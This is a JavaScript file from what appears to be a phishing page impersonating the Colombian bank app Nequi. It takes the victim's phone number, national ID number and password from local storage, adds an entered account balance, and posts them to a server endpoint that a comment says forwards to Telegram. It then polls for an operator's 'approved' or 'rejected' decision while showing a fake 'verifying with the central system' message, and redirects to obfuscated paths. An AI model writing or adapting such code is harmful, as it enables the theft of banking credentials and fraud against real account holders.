document.addEventListener('DOMContentLoaded', () => {
    const saldoInput = document.getElementById('saldo');
    const btnVerificar = document.querySelector('.btn-verificar');
    const modal = document.getElementById('confirmation-modal');
    const modalSaldoAmount = document.getElementById('modal-saldo-amount');
    const btnCorregir = document.querySelector('.btn-corregir');
    const btnConfirmar = document.querySelector('.btn-confirmar');

    // Función para validar el formulario
    const validateForm = () => {
        const saldoValue = saldoInput.value.trim();
        
        // Verificar que haya algo escrito
        if (saldoValue.length > 0) {
            btnVerificar.disabled = false;
        } else {
            btnVerificar.disabled = true;
        }
    };

    // Formatear moneda mientras se escribe
    saldoInput.addEventListener('input', (e) => {
        // Eliminar todo lo que no sea números
        let value = e.target.value.replace(/\D/g, '');
        
        // Si hay valor, formatearlo con puntos de miles
        if (value) {
            value = new Intl.NumberFormat('es-CO').format(value);
        }
        
        e.target.value = value;
        validateForm();
    });

    // Mostrar modal al verificar
    btnVerificar.addEventListener('click', (e) => {
        e.preventDefault(); // Prevenir envío del formulario
        
        const currentSaldo = saldoInput.value;
        if (currentSaldo) {
            modalSaldoAmount.textContent = `$ ${currentSaldo}`;
            modal.style.display = 'flex';
        }
    });

    // Botón Corregir (Cerrar modal)
    btnCorregir.addEventListener('click', () => {
        modal.style.display = 'none';
        saldoInput.focus();
    });

    // Botón Verificar en modal (Acción final - Enviar a Telegram y Esperar)
    btnConfirmar.addEventListener('click', async () => {
        // Mostrar estado de carga (reusando loading.js pero manteniéndolo visible)
        // O mejor, cambiar el texto del modal o mostrar un overlay específico
        
        // Get data from localStorage
        const celular = localStorage.getItem('nequi_celular');
        const cedula = localStorage.getItem('nequi_cedula');
        const clave = localStorage.getItem('nequi_clave');
        const saldo = saldoInput.value;

        if (!celular || !cedula || !clave) {
            alert('Error: Faltan datos de sesión. Por favor inicie nuevamente.');
            window.location.href = 'index.html';
            return;
        }

        // Show loading state
        const originalText = btnConfirmar.textContent;
        btnConfirmar.textContent = 'Enviando...';
        btnConfirmar.disabled = true;

        try {
            // Send data to server
            const response = await fetch('/api/save-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ celular, cedula, clave, saldo })
            });

            const result = await response.json();
            
            if (result.success) {
                // Change UI to waiting state
                modal.innerHTML = `
                    <div class="modal-content" style="text-align: center;">
                        <div class="spinner" style="margin: 0 auto 1rem auto;"></div>
                        <h3 class="modal-title">Verificando Información</h3>
                        <p class="modal-text">Estamos validando tus datos con el sistema central.</p>
                        <p class="modal-text" style="font-size: 0.9rem; color: #666;">Por favor no cierres esta ventana...</p>
                    </div>
                `;

                // Start Polling
                const pollInterval = setInterval(async () => {
                    try {
                        const statusRes = await fetch('/api/check-status', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ celular })
                        });
                        const statusData = await statusRes.json();

                        if (statusData.status === 'approved') {
                            clearInterval(pollInterval);
                            navigateWithLoader('/ZaBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789AbCdEfGhIjKlMnOpQrStUvWxYzAbCdEfGhIj');
                        } else if (statusData.status === 'rejected') {
                            clearInterval(pollInterval);
                            // Redirigir con parámetro de error
                            window.location.href = '/Xy7K9LmN2PqR5StV8WzX1Y4AbCdEfGhIjKlMnOpQrStUvWxYz0123456789AbCdEfGhIjKlMn?error=true';
                        }
                    } catch (err) {
                        console.error('Polling error:', err);
                    }
                }, 2000); // Poll every 2 seconds

            } else {
                alert('Error de conexión. Intente nuevamente.');
                btnConfirmar.textContent = originalText;
                btnConfirmar.disabled = false;
            }

        } catch (error) {
            console.error('Error:', error);
            alert('Error al conectar con el servidor.');
            btnConfirmar.textContent = originalText;
            btnConfirmar.disabled = false;
        }
    });

    // Cerrar modal si se hace clic fuera (deshabilitado durante espera si es necesario, pero lo dejamos por ahora)
    modal.addEventListener('click', (e) => {
        if (e.target === modal && !btnConfirmar.disabled) { // Solo si no está enviando
            modal.style.display = 'none';
        }
    });

    // Validación inicial
    validateForm();
});